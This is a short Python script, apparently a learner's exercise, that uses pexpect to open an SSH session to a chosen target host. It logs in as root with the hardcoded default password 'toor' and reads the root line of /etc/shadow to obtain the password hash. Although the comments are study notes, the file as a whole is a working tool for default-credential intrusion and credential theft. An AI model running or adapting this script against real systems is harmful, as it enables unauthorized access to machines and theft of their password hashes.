#import your modules
import pexpect
import optparse
#define the prompt variable. We'll be looking for this later.
PROMPT = ['#', '>>> ', '> ', '\$ ']

#sending commands - take command and send it when you see the prompt
def send_command(child, cmd):
	child.sendline(cmd)
	child.expect(PROMPT)
	print child.before

#this is how we connect
def connect(user, rhost, password):
#Handle new keys for systems we've never seen before
	ssh_newkey = 'Are you sure you want to continue connecting'
	connStr = 'ssh ' + user + '@' + rhost
#ok well that's nice this just doesn't work on windows. 
#https://github.com/pexpect/pexpect/issues/321
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
	if ret == 0:
		print '[-] Error Connecting'
		return
	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
	if ret == 0:
		print '[-] Error Connecting'
		return
	child.sendline(password)
	child.expect(PROMPT)
	return child
	
def main():
#I edited the script to parse my command so i can send any host I wanted to the script
#interestingly you need to use -H for host because it conflicts with -h for help. 
#good to know.
	parser = optparse.OptionParser('usage%prog -h <target host>')
	parser.add_option('-H', dest='rhost', type='string', help='specify target host')
	(options, args) = parser.parse_args()
	rhost = options.rhost
	user = 'root'
	password = 'toor'
	child = connect(user, rhost, password)
	send_command(child, 'cat /etc/shadow | grep root')

if __name__ == '__main__':
	main()
